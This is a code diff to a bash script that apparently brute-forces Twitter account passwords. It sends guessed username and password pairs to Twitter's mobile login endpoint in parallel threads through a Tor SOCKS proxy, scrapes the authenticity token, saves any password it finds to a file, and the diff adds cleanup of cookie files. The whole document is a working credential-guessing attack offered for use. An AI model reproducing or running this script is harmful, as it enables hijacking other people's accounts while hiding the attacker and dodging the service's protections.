@@ -73,6 +73,7 @@ sleep 6
 else
 sleep 3
 fi
+rm -rf cookies*
 default_session="Y"
 printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $username
 read -p $'\e[1;77m? [Y/n]: \e[0m' session
@@ -124,7 +125,7 @@ COOKIES='cookies'$countpass''
 let token++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
 
-{(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"/account/login_verification"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; kill -1 $$; fi;  ) } & done; wait $!;
+{(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"/account/login_verification"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi;  ) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
